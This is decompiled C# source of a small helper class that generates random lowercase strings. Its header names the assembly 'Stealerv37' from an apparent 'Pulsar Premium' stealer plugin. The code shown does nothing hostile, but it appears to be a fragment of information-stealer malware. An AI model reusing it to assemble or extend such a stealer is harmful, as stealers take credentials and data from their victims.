// Decompiled with JetBrains decompiler
// Type: Intelix.Helper.RandomStrings
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using System;
using System.Linq;

#nullable disable
namespace Intelix.Helper;

public static class RandomStrings
{
  private const string Ascii = "abcdefghijklmnopqrstuvwxyz";
  private static readonly Random Random = new Random();

  public static string GenerateHashTag() => " #" + RandomStrings.GenerateString();

  public static string GenerateString() => RandomStrings.GenerateString(5);

  public static string GenerateString(int length)
  {
    char ch = "abcdefghijklmnopqrstuvwxyz"[RandomStrings.Random.Next("abcdefghijklmnopqrstuvwxyz".Length)];
    char[] array = Enumerable.Repeat<string>("abcdefghijklmnopqrstuvwxyz", length - 1).Select<string, char>((Func<string, char>) (s => s[RandomStrings.Random.Next(s.Length)])).ToArray<char>();
    return ch.ToString() + new string(array);
  }
}
